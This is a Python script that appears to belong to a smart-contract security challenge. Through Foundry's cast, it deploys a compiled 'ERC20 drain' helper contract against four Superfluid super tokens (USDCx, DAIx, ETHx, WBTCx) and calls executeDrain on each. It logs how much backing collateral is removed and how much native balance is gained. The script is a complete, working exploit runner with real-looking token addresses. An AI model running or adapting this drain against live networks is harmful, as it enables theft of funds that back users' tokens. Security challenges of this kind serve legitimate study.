#!/usr/bin/env python3
import json
import os
import pathlib
import subprocess
import sys
from datetime import datetime, timezone


ROOT = pathlib.Path("/Users/dldustn/Desktop/AssignmentC")
CH_DIR = ROOT / "challenges" / "ch5_superfluid_v2"
ARTIFACT_PATH = CH_DIR / "out" / "Run.s.sol" / "Ch5ERC20Drain.json"
LOG_PATH = CH_DIR / "runs" / "exploit_1776535961.log"

ROUTER = "0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff"
BOOTSTRAP = 250000000000000000000

TOKENS = [
    {
        "label": "USDCx tail pass 2",
        "super_token": "0xCAa7349CEA390F89641fe306D93591f87595dc1F",
        "underlying": "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
        "index_base": 650_000_000,
    },
    {
        "label": "DAIx tail pass 2",
        "super_token": "0x1305F6B6Df9Dc47159D12Eb7aC2804d4A33173c2",
        "underlying": "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
        "index_base": 660_000_000,
    },
    {
        "label": "ETHx tail pass 2",
        "super_token": "0x27e1e4E6BC79D93032abef01025811B7E4727e85",
        "underlying": "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
        "index_base": 665_000_000,
    },
    {
        "label": "WBTCx tail pass 2",
        "super_token": "0x4086eBf75233e8492F1BCDa41C7f2A8288c2fB92",
        "underlying": "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6",
        "index_base": 670_000_000,
    },
]


def run(cmd: list[str]) -> subprocess.CompletedProcess[str]:
    return subprocess.run(cmd, text=True, capture_output=True)


def log(line: str = "") -> None:
    with LOG_PATH.open("a") as fh:
        fh.write(line)
        if not line.endswith("\n"):
            fh.write("\n")


def uint_call(rpc: str, token: str, account: str) -> int:
    proc = run(["cast", "call", token, "balanceOf(address)(uint256)", account, "--rpc-url", rpc])
    if proc.returncode != 0:
        raise SystemExit(proc.stderr.strip())
    return int(proc.stdout.split()[0])


def receipt_or_die(raw: str, tx_index: str) -> dict:
    receipt = json.loads(raw)
    if receipt.get("status") != "0x1":
        raise SystemExit(f"{tx_index} reverted")
    return receipt


def main() -> int:
    rpc = os.environ["RPC_CH5_SUPERFLUID_V2"]
    private_key = os.environ["PRIVATE_KEY"]
    public_address = os.environ["PUBLIC_ADDRESS"]

    artifact = json.loads(ARTIFACT_PATH.read_text())
    creation_bytecode = artifact["bytecode"]["object"]

    pre_balance = int(run(["cast", "balance", public_address, "--rpc-url", rpc]).stdout.strip())
    pre_nonce = int(run(["cast", "nonce", public_address, "--rpc-url", rpc]).stdout.strip())

    log(f"=== exploit_1776535961_continuation2 {datetime.now(timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')} ===")
    log(f"$ cast nonce $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2\n{pre_nonce}")
    log(f"$ cast balance $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2\n{pre_balance}")

    tx_hashes: list[str] = []

    for token in TOKENS:
        label = token["label"]
        before_native = int(run(["cast", "balance", public_address, "--rpc-url", rpc]).stdout.strip())
        before_backing = uint_call(rpc, token["underlying"], token["super_token"])

        log(label)
        log(f"backing before: {before_backing}")
        log(f"bootstrap native: {BOOTSTRAP}")

        encoded = run(
            [
                "cast",
                "abi-encode",
                "constructor(address,address,uint32)",
                token["super_token"],
                ROUTER,
                str(token["index_base"]),
            ]
        )
        if encoded.returncode != 0:
            log(encoded.stderr)
            return 1
        init_code = creation_bytecode + encoded.stdout.strip()[2:]

        create_proc = run(
            [
                "cast",
                "send",
                "--gas-limit",
                "3500000",
                "--rpc-url",
                rpc,
                "--private-key",
                private_key,
                "--json",
                "--create",
                init_code,
            ]
        )
        if create_proc.stdout:
            log(create_proc.stdout)
        if create_proc.stderr:
            log(create_proc.stderr)
        if create_proc.returncode != 0:
            return create_proc.returncode

        create_receipt = receipt_or_die(create_proc.stdout, f"{label} create")
        helper = create_receipt["contractAddress"]
        tx_hashes.append(create_receipt["transactionHash"])

        call_proc = run(
            [
                "cast",
                "send",
                "--gas-limit",
                "6000000",
                "--rpc-url",
                rpc,
                "--private-key",
                private_key,
                "--json",
                helper,
                "executeDrain(uint256,uint256)",
                "1",
                "20",
                "--value",
                str(BOOTSTRAP),
            ]
        )
        if call_proc.stdout:
            log(call_proc.stdout)
        if call_proc.stderr:
            log(call_proc.stderr)
        if call_proc.returncode != 0:
            return call_proc.returncode

        call_receipt = receipt_or_die(call_proc.stdout, f"{label} execute")
        tx_hashes.append(call_receipt["transactionHash"])

        after_native = int(run(["cast", "balance", public_address, "--rpc-url", rpc]).stdout.strip())
        after_backing = uint_call(rpc, token["underlying"], token["super_token"])

        log(f"native delta: {after_native - before_native}")
        log(f"backing after: {after_backing}")

        print(
            json.dumps(
                {
                    "label": label,
                    "helper": helper,
                    "native_delta": str(after_native - before_native),
                    "backing_before": str(before_backing),
                    "backing_after": str(after_backing),
                }
            )
        )

    post_balance = int(run(["cast", "balance", public_address, "--rpc-url", rpc]).stdout.strip())
    post_nonce = int(run(["cast", "nonce", public_address, "--rpc-url", rpc]).stdout.strip())
    log(f"$ cast nonce $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2\n{post_nonce}")
    log(f"$ cast balance $PUBLIC_ADDRESS --rpc-url $RPC_CH5_SUPERFLUID_V2\n{post_balance}")

    print(
        json.dumps(
            {
                "tx_hashes": tx_hashes,
                "pre_balance_wei": str(pre_balance),
                "post_balance_wei": str(post_balance),
                "actual_delta_wei": str(post_balance - pre_balance),
                "post_nonce": str(post_nonce),
            },
            indent=2,
        )
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
